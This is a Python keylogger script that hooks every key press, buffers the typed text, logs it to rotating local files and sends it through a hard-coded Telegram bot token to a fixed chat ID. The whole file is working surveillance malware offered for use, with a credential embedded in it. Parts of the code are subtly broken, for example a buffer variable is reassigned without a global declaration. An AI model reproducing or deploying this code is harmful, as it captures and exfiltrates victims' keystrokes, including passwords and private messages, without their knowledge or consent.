import keyboard
import telebot
import os
from datetime import datetime
from threading import Lock, Timer

# ===== CONFIGURATION ===== #
BOT_TOKEN = "7668132689:AAF9u8pHOdiU4bkBURY0yofjLR49XHpt0Vg"
CHAT_ID = "5633755314"
LOG_DIR = "keystroke_logs"
FLUSH_INTERVAL = 2  # Send after 2 sec of inactivity
LOG_INTERVAL = 3600  # 1 hour (in seconds)

# ===== SETUP ===== #
os.makedirs(LOG_DIR, exist_ok=True)
bot = telebot.TeleBot(BOT_TOKEN)

# Buffers & Locks
text_buffer = ""
log_buffer = ""
buffer_lock = Lock()
last_activity_time = datetime.now()
current_log_file = None
log_timer = None

# Special Key Handling
SPECIAL_KEYS = {
    'space': ' ',
    'enter': '\n',
    'tab': '\t'
}

# ===== LOG MANAGEMENT ===== #
def get_log_filename():
    return os.path.join(LOG_DIR, f"keystrokes_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log")

def start_new_log():
    global current_log_file, log_timer
    current_log_file = get_log_filename()
    with open(current_log_file, 'a') as f:
        f.write(f"### Keylogger Started at {datetime.now()} ###\n\n")
    log_timer = Timer(LOG_INTERVAL, rotate_log)
    log_timer.start()

def rotate_log():
    if log_buffer:
        save_to_log()
    start_new_log()

def save_to_log():
    if log_buffer and current_log_file:
        with open(current_log_file, 'a') as f:
            f.write(f"{log_buffer}\n")
        log_buffer = ""

# ===== KEY PROCESSING ===== #
def process_key(event):
    global text_buffer, log_buffer, last_activity_time

    # Handle Backspace (Remove last character)
    if event.name == 'backspace':
        if text_buffer:
            text_buffer = text_buffer[:-1]
        if log_buffer:
            log_buffer = log_buffer[:-1]
        last_activity_time = datetime.now()
        return

    # Handle Other Keys
    key = SPECIAL_KEYS.get(event.name, event.name)
    text_buffer += key
    log_buffer += key
    last_activity_time = datetime.now()

# ===== TELEGRAM UPDATES ===== #
def send_to_telegram():
    global text_buffer
    if text_buffer:
        timestamp = datetime.now().strftime("%H:%M:%S")
        message = f"⌨️ [{timestamp}]\n{text_buffer}"
        try:
            bot.send_message(CHAT_ID, message)
            text_buffer = ""
        except Exception as e:
            print(f"⚠️ Telegram Error: {e}")

# ===== ACTIVITY CHECKER ===== #
def check_activity():
    if (datetime.now() - last_activity_time).seconds >= FLUSH_INTERVAL and text_buffer:
        send_to_telegram()
    Timer(1, check_activity).start()

# ===== KEYBOARD HANDLER ===== #
def on_key_press(event):
    process_key(event)
    if event.name == 'enter':
        send_to_telegram()

# ===== CLEAN EXIT ===== #
def cleanup():
    if text_buffer:
        send_to_telegram()
    if log_buffer:
        save_to_log()
    if log_timer:
        log_timer.cancel()
    print("✅ Keylogger stopped safely")

# ===== START ===== #
if __name__ == "__main__":
    start_new_log()
    keyboard.on_press(on_key_press)
    check_activity()
    try:
        keyboard.wait()
    except KeyboardInterrupt:
        pass
    finally:
        cleanup()